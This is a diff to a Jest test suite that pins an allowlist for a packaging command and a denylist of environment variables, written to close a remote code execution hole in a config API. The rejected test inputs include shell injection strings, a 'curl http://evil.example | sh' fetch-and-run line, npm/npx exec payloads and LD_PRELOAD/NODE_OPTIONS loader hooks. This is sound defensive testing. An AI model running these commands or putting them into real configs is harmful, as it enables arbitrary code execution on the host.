@@ -1480,7 +1457,7 @@ describe('updateConfig', () => {
     const result = cm.updateConfig({ serverPort: 4100 });
     expect(result.path).toBe(cwdFile);
     // Nothing was loaded back, so the resolved value kept its default.
-    expect(cm.getServerPort()).toBe(3100);
+    expect(cm.getServerPort()).toBe(14566);
     expect(result.restartRequired).toEqual([]);
   });
 
@@ -1519,5 +1496,384 @@ describe('updateConfig', () => {
     expect(cm.getRegion()).toBe('sa-east-1');
     expect(result.restartRequired).toEqual([]);
     expect(result.envOverridden).toEqual(['region']);
+  });
+
+  // PUT /api/config is unauthenticated and `packageCommand` is spawned by
+  // serverless-packager (spawn(firstToken, restTokens), with `packageArgs`
+  // appended) on the next POST /api/services/package. Without a fence that pair
+  // is arbitrary code execution on the host, which is what these tests pin.
+  describe('packageCommand runner allowlist', () => {
+    const RUNNERS = 'npm, npx, yarn, pnpm, serverless, sls, osls';
+
+    it('rejects the /bin/sh + packageArgs chain — nothing reaches the file', () => {
+      const cm = setupFile({});
+      // The demonstrated payload, verbatim: a shell as the command and the
+      // real work smuggled in as argv (packageArgs bypasses the tokenizer
+      // entirely, so a valid-looking string array is all the attacker needs).
+      const err = updateErr(cm, {
+        packageCommand: '/bin/sh',
+        packageArgs: ['-c', 'id > /tmp/pwned'],
+      });
+      expect(err.name).toBe('ConfigValidationError');
+      expect(err.details).toEqual([
+        `"packageCommand" must start with one of: ${RUNNERS} — "/bin/sh" is not an allowed package runner`,
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    it('rejects interpreters, absolute paths and every path spelling', () => {
+      const cm = setupFile({});
+      const rejected: Array<[string, string]> = [
+        ['bash -c "id"', 'bash'],
+        ['curl http://evil.example | sh', 'curl'],
+        ['node -e "require(\'child_process\').exec(\'id\')"', 'node'],
+        ['/usr/local/bin/npm run package', '/usr/local/bin/npm'],
+        // A relative path is still a path: it names a binary the caller
+        // planted, not a runner on PATH.
+        ['./npm package', './npm'],
+        ['../../tools/npm package', '../../tools/npm'],
+        ['node_modules/.bin/serverless package', 'node_modules/.bin/serverless'],
+        ['C:\\Windows\\System32\\cmd.exe /c id', 'C:\\Windows\\System32\\cmd.exe'],
+        // `env` reaches any binary with any environment — the whole point of
+        // the allowlist, one indirection away.
+        ['env NODE_OPTIONS=--require=/tmp/x.js npm run package', 'env'],
+        // Quoting must not launder the token: the packager strips the quotes
+        // before spawning, so validation strips them too.
+        ['"/bin/sh" -c id', '/bin/sh'],
+        ["'/bin/sh' -c id", '/bin/sh'],
+        // A near-miss on an allowed name is still not that name.
+        ['npmx run package', 'npmx'],
+        ['NPM run package', 'NPM'],
+      ];
+      for (const [command, runner] of rejected) {
+        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
+          `"packageCommand" must start with one of: ${RUNNERS} — "${runner}" is not an allowed package runner`,
+        ]);
+      }
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    it('rejects a command that tokenizes to nothing, and a non-string', () => {
+      const cm = setupFile({});
+      // Whitespace only: non-empty as a string, but the packager would spawn
+      // nothing at all, so it reports the same "not an allowed runner" verdict
+      // with an empty token rather than slipping through.
+      expect(updateErr(cm, { packageCommand: '   ' }).details).toEqual([
+        `"packageCommand" must start with one of: ${RUNNERS} — "" is not an allowed package runner`,
+      ]);
+      // The plain string checks still run first.
+      expect(updateErr(cm, { packageCommand: '' }).details).toEqual([
+        '"packageCommand" must be a non-empty string',
+      ]);
+      expect(updateErr(cm, { packageCommand: 123 }).details).toEqual([
+        '"packageCommand" must be a non-empty string',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    it('fences the per-service copy the same way, reporting the entry path', () => {
+      const cm = setupFile({});
+      expect(updateErr(cm, {
+        servicePackaging: { access: { packageCommand: '/bin/sh', packageArgs: ['-c', 'id'] } },
+      }).details).toEqual([
+        `"servicePackaging.access.packageCommand" must start with one of: ${RUNNERS} — "/bin/sh" is not an allowed package runner`,
+      ]);
+      expect(updateErr(cm, {
+        servicePackaging: { access: { packageCommand: '' } },
+      }).details).toEqual([
+        '"servicePackaging.access.packageCommand" must be a non-empty string',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // The bypass that survived the first version of this fence: every allowed
+    // runner is itself an interpreter one subcommand in, and
+    // `spawn('npm', ['exec','-c','<shell string>'])` executes that string with
+    // no shell:true anywhere. Checking the first token alone let all of these
+    // through while reporting "npm"/"npx"/"yarn"/"pnpm" as an allowed runner.
+    it('rejects the interpreter subcommands of the allowed runners', () => {
+      const cm = setupFile({});
+      const rejected: Array<[string, string, string]> = [
+        // Reads its payload straight off the argv — a shell on the host.
+        ['npm exec -c "touch /tmp/RCE_PROOF && id -un > /tmp/RCE_PROOF"', 'npm', 'exec'],
+        ['npm x -c "id"', 'npm', 'x'],
+        // Fetch-and-run: the package is the caller's, not the project's.
+        ['npm exec -p evil-pkg -- evil', 'npm', 'exec'],
+        ['yarn dlx evil-pkg', 'yarn', 'dlx'],
+        ['pnpm dlx evil-pkg', 'pnpm', 'dlx'],
+        ['npm install evil-pkg', 'npm', 'install'],
+        ['yarn add evil-pkg', 'yarn', 'add'],
+        // Install scripts of a fetched package run as this user, so `add`/`i`
+        // are fetch-and-run with an extra step, not an installer.
+        ['npm i evil-pkg', 'npm', 'i'],
+        // Straight interpreters, reached through the manager's own builtins.
+        ['yarn node -e "require(\'child_process\').exec(\'id\')"', 'yarn', 'node'],
+        ['yarn exec sh -c id', 'yarn', 'exec'],
+        ['pnpm exec sh -c id', 'pnpm', 'exec'],
+        ['yarn create evil-app', 'yarn', 'create'],
+        // yarn 1's implicit `run` is what makes `yarn node` and `yarn dlx`
+        // indistinguishable from a script name, so the explicit form is
+        // required — `yarn run package`, not `yarn package`.
+        ['yarn package', 'yarn', 'package'],
+        ['pnpm package', 'pnpm', 'package'],
+        // The Serverless CLIs fetch and run code too, one verb over.
+        ['serverless plugin install --name evil-plugin', 'serverless', 'plugin'],
+        ['sls plugin install --name evil-plugin', 'sls', 'plugin'],
+        ['osls plugin install --name evil-plugin', 'osls', 'plugin'],
+      ];
+      const verbsOf: Record<string, string> = {
+        npm: '"run" or "run-script"',
+        yarn: '"run"',
+        pnpm: '"run"',
+        serverless: '"package"',
+        sls: '"package"',
+        osls: '"package"',
+      };
+      for (const [command, runner, verb] of rejected) {
+        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
+          `"packageCommand": "${runner}" may only be followed by ${verbsOf[runner]} — `
+            + `"${verb}" can run a program the caller chose instead of the project's build`,
+        ]);
+      }
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // A runner with no subcommand at all is the same bypass with the verb moved
+    // into `packageArgs` (which reaches spawn() without a tokenizer), so the
+    // command has to carry it.
+    it('rejects a bare runner, including the packageArgs-smuggled spelling', () => {
+      const cm = setupFile({});
+      expect(updateErr(cm, {
+        packageCommand: 'npm',
+        packageArgs: ['exec', '-c', 'id > /tmp/pwned'],
+      }).details).toEqual([
+        '"packageCommand": "npm" may only be followed by "run" or "run-script" — the command names no subcommand at all',
+      ]);
+      expect(updateErr(cm, { packageCommand: 'serverless' }).details).toEqual([
+        '"packageCommand": "serverless" may only be followed by "package" — the command names no subcommand at all',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // npx is a launcher, so it is stripped and what it launches is held to the
+    // same grammar. `npx -c '<shell>'` was the shortest RCE of the whole set.
+    it('lets npx run only the Serverless CLI, and carry only -y/--yes', () => {
+      const cm = setupFile({});
+      const badFlags = ['npx -c "id > /tmp/pwned"', 'npx --call "id"', 'npx -p evil-pkg serverless package', 'npx -y -c "id"'];
+      for (const command of badFlags) {
+        const flag = command.split(' ')[command.startsWith('npx -y') ? 2 : 1];
+        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
+          `"packageCommand": npx may carry only "-y" or "--yes" before the package name — "${flag}" can name another package to run, or a command string to run as a shell`,
+        ]);
+      }
+      const badPackages: Array<[string, string]> = [
+        ['npx evil-pkg', 'evil-pkg'],
+        ['npx -y evil-pkg --run', 'evil-pkg'],
+        ['npx node -e "id"', 'node'],
+        // A scoped name keeps its leading @ — that one is a scope, not a
+        // version pin, so it is compared whole and matches nothing.
+        ['npx @evil/serverless package', '@evil/serverless'],
+        // npx with nothing to launch names no program either way.
+        ['npx', ''],
+        ['npx -y', ''],
+      ];
+      for (const [command, spec] of badPackages) {
+        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
+          `"packageCommand": npx may only run the Serverless CLI (serverless, sls, osls) — "${spec}" is a package of the caller's choosing`,
+        ]);
+      }
+      // …and the CLI it launches still owes the grammar its own verb.
+      expect(updateErr(cm, { packageCommand: 'npx serverless plugin install --name evil' }).details).toEqual([
+        '"packageCommand": "serverless" may only be followed by "package" — "plugin" can run a program the caller chose instead of the project\'s build',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // The grammar pins the program; these flags re-point it at another one
+    // without changing a single positional token.
+    it('rejects flags that redirect an otherwise-allowed command', () => {
+      const cm = setupFile({});
+      const rejected = [
+        // npm picks the binary that interprets the script.
+        'npm run package --script-shell=/tmp/evil',
+        // The flag spelling of the NODE_OPTIONS that packageEnv already blocks.
+        'npm run package --node-options=--require /tmp/x.js',
+        // Dashes and case are cosmetic to a config key, so they are stripped
+        // before the comparison.
+        'npm run package --nodeOptions=--require /tmp/x.js',
+        // Another rc file can set script-shell/node-options/yarn-path.
+        'npm run package --userconfig /tmp/evil-npmrc',
+        'yarn run package --use-yarnrc /tmp/evil-yarnrc',
+        // npx fetches the CLI when the service has no local copy, and npm reads
+        // its own config flags from anywhere in the argv — so the registry the
+        // fetch uses is still the caller's choice unless this is refused.
+        'npx serverless package --registry=http://evil.example',
+        // Run the scripts of a package.json the caller planted elsewhere.
+        'npm run package --prefix /tmp/evil',
+        'pnpm run package --dir /tmp/evil',
+        // node's own code loaders, refused wherever they appear.
+        'npx serverless package --require /tmp/x.js',
+      ];
+      for (const command of rejected) {
+        const flag = command.split(' ').find(t => t.startsWith('-')) as string;
+        expect(updateErr(cm, { packageCommand: command }).details).toEqual([
+          `"packageCommand" cannot contain "${flag}" — that flag points the package command at a program, shell or config file of the caller's choosing`,
+        ]);
+      }
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // packageArgs is appended to the same argv with no tokenizer in between, so
+    // it answers to the same flag screen — global and per-service.
+    it('screens packageArgs for the same redirecting flags', () => {
+      const cm = setupFile({});
+      expect(updateErr(cm, {
+        packageCommand: 'npm run package',
+        packageArgs: ['--stage=dev', '--node-options=--require /tmp/x.js'],
+      }).details).toEqual([
+        '"packageArgs[1]" cannot contain "--node-options=--require /tmp/x.js" — that flag points the package command at a program, shell or config file of the caller\'s choosing',
+      ]);
+      expect(updateErr(cm, {
+        servicePackaging: { access: { packageArgs: ['--script-shell=/tmp/evil'] } },
+      }).details).toEqual([
+        '"servicePackaging.access.packageArgs[0]" cannot contain "--script-shell=/tmp/evil" — that flag points the package command at a program, shell or config file of the caller\'s choosing',
+      ]);
+      // The shape error still comes first and keeps its wording.
+      expect(updateErr(cm, { packageArgs: ['ok', 7] }).details).toEqual([
+        '"packageArgs" must be an array of strings',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // The dashboard (OnboardingPage/SettingsPage) writes exactly these shapes
+    // through PUT /api/config; the fence must not cost the onboarding flow a
+    // single legitimate command.
+    it('accepts every legitimate packaging command, global and per-service', () => {
+      const accepted = [
+        'npx serverless package', // the LSS default
+        'npm run package',
+        'npm run package:local',
+        'npm run-script package',
+        'yarn run package',
+        'pnpm run package',
+        'serverless package --stage dev',
+        'sls package',
+        'osls package',
+        'npx sls package --param="custom-stage=offline"',
+        // `-y` is the one npx flag that only answers a prompt.
+        'npx -y serverless package',
+        // A version pin names the same program.
+        'npx serverless@3.38.0 package',
+        // Serverless's own short flags stay usable: -c/-p/-r are --config,
+        // --package and --region there, so the screen never claims them.
+        'sls package -c custom.yml -p .build -r us-east-1',
+        // Quoted runner: the packager unquotes before spawning, so validation
+        // sees the same `npm` it does.
+        '"npm" run package',
+      ];
+      for (const command of accepted) {
+        const cm = setupFile({});
+        cm.updateConfig({ packageCommand: command, servicePackaging: { access: { packageCommand: command } } });
+        expect(written().packageCommand).toBe(command);
+        expect(written().servicePackaging).toEqual({ access: { packageCommand: command } });
+      }
+      // The documented packageArgs example is untouched by the flag screen.
+      const cm = setupFile({});
+      cm.updateConfig({ packageArgs: ['--param=custom-stage=offline'] });
+      expect(written().packageArgs).toEqual(['--param=custom-stage=offline']);
+    });
+  });
+
+  describe('packageEnv loader-hook denylist', () => {
+    it('rejects NODE_OPTIONS — code injection that ignores which binary ran', () => {
+      const cm = setupFile({});
+      expect(updateErr(cm, { packageEnv: { NODE_OPTIONS: '--require /tmp/x.js' } }).details).toEqual([
+        '"packageEnv.NODE_OPTIONS" cannot be set — it injects code into the packaging process',
+      ]);
+      // Windows env lookup is case-insensitive, so the lowercase spelling is
+      // the identical bypass and is compared the same way.
+      expect(updateErr(cm, { packageEnv: { node_options: '--require /tmp/x.js' } }).details).toEqual([
+        '"packageEnv.node_options" cannot be set — it injects code into the packaging process',
+      ]);
+      expect(updateErr(cm, { packageEnv: { Node_Options: '--require /tmp/x.js' } }).details).toEqual([
+        '"packageEnv.Node_Options" cannot be set — it injects code into the packaging process',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    // PATH is the member that reads as configuration rather than as an attack.
+    // The packager spawns without a shell, but the shell was never what found
+    // the binary: libuv execvp()s with the CHILD's environment, so the child's
+    // PATH picks which file named `npm` runs. Verified by planting an
+    // executable named `npm` on a prepended directory — it ran. Allowing it
+    // would hand back exactly what ALLOWED_PACKAGE_RUNNERS takes away.
+    it('rejects PATH and NODE_PATH — they choose which binary the runner allowlist resolves to', () => {
+      const cm = setupFile({});
+      expect(updateErr(cm, { packageEnv: { PATH: '/tmp/evil:/usr/bin' } }).details).toEqual([
+        '"packageEnv.PATH" cannot be set — it injects code into the packaging process',
+      ]);
+      expect(updateErr(cm, { packageEnv: { path: '/tmp/evil' } }).details).toEqual([
+        '"packageEnv.path" cannot be set — it injects code into the packaging process',
+      ]);
+      expect(updateErr(cm, { packageEnv: { NODE_PATH: '/tmp/evil' } }).details).toEqual([
+        '"packageEnv.NODE_PATH" cannot be set — it injects code into the packaging process',
+      ]);
+      // The per-service map carries the same fence as the global one.
+      expect(updateErr(cm, {
+        servicePackaging: { svc: { packageEnv: { PATH: '/tmp/evil' } } },
+      }).details).toEqual([
+        '"servicePackaging.svc.packageEnv.PATH" cannot be set — it injects code into the packaging process',
+      ]);
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    it('rejects every linker/interpreter hook, in both env maps', () => {
+      const cm = setupFile({});
+      const blocked = [
+        'NODE_OPTIONS',
+        'NODE_REPL_EXTERNAL_MODULE',
+        'LD_PRELOAD',
+        'LD_AUDIT',
+        'LD_LIBRARY_PATH',
+        'DYLD_INSERT_LIBRARIES',
+        'DYLD_LIBRARY_PATH',
+        'PATH',
+        'NODE_PATH',
+      ];
+      for (const name of blocked) {
+        expect(updateErr(cm, { packageEnv: { [name]: '/tmp/evil.so' } }).details).toEqual([
+          `"packageEnv.${name}" cannot be set — it injects code into the packaging process`,
+        ]);
+        expect(updateErr(cm, {
+          servicePackaging: { access: { packageEnv: { [name]: '/tmp/evil.so' } } },
+        }).details).toEqual([
+          `"servicePackaging.access.packageEnv.${name}" cannot be set — it injects code into the packaging process`,
+        ]);
+      }
+      expect(fs.writeFileSync).not.toHaveBeenCalled();
+    });
+
+    it('reports the value-shape error before the key check', () => {
+      // Same message as any other string record — a non-string value never
+      // reaches the key scan.
+      expect(updateErr(setupFile({}), { packageEnv: { NODE_OPTIONS: 1 } }).details).toEqual([
+        '"packageEnv" must be an object of string values',
+      ]);
+    });
+
+    it('leaves ordinary packaging env vars alone, and only fences env maps', () => {
+      const cm = setupFile({});
+      cm.updateConfig({
+        packageEnv: { NPM_TOKEN: 's3cret', SLS_DEBUG: '*', AWS_PROFILE: 'dev' },
+        servicePackaging: { access: { packageEnv: { STAGE: 'offline' } } },
+        // A branding token that merely SHARES a blocked name is still just a
+        // CSS value: the denylist applies to maps that become a child's
+        // environment, not to every string record.
+        branding: { colors: { NODE_OPTIONS: '#fff' } },
+      });
+      expect(written().packageEnv).toEqual({ NPM_TOKEN: 's3cret', SLS_DEBUG: '*', AWS_PROFILE: 'dev' });
+      expect(written().servicePackaging).toEqual({ access: { packageEnv: { STAGE: 'offline' } } });
+      expect(written().branding).toEqual({ colors: { NODE_OPTIONS: '#fff' } });
+    });
   });
 });
